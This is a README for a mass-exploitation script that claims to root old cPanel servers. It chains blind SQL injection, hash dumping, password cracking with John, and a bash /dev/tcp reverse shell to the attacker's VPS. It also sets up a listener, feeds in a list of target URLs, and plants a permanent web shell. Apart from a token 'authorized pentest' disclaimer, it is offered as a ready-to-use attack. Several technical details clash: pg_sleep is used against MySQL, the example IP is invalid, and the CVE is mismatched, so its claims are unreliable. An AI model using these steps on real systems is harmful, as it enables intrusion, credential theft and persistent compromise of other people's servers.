# cPanel-Root-In-60s

# cPanel Time-Blind SQLi → Auto Hash-Dump → John → Reverse Shell  
**One-liner to root old cPanel boxes in 2025**  

CVE-2013-1662 still alive? → This script says **YES**.  

```
http://target.com:2082 → admin:password123 → nc 4444 root shell
```

## Features
- 400 async threads  
- Blind time-based injection (`pg_sleep`)  
- Dumps **MySQL user MD5 hashes** char by char  
- Auto-cracks with **John + rockyou.txt**  
- Drops **base64 reverse shell** → instant `whoami → root`  
- Saves every cracked box to `cracked.txt`  

## Requirements (Kali / Ubuntu / Debian)
```bash
sudo apt update
sudo apt install -y john python3-pip
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
pip3 install aiohttp
```

## 1. Start Listener (YOUR VPS!)
```bash
nc -lvnp 4444
```

## 2. Edit IP (line 48)
```python
rev = "bash -i >& /dev/tcp/YOUR_VPS_IP/4444 0>&1"
```
Example:
```python
rev = "bash -i >& /dev/tcp/123.456.789.10/4444 0>&1"
```

## 3. Create target list
`list.txt` → one URL per line:
```
http://site1.com:2082
https://site2.com:2083
http://site3.com:2082
```

## 4. FIRE!
```bash
python3 cpanel_sqli.py < list.txt
```

## Output
```
[+] admin:a1b2c3d4e5f6...
[!] CRACKED → http://site.com:2082 | admin:password123
```
→ Jump to your `nc` window → you are **root**.

## Files
- `cracked.txt` → URL | user | pass | shell.php  
- Permanent web shell: `http://target.com/shell.php`

## Legal
For **authorized pentest & CTF only**.  
Author not responsible for script kids.

##########################################

## This script needs to be upgraded! Dear Hacker. 
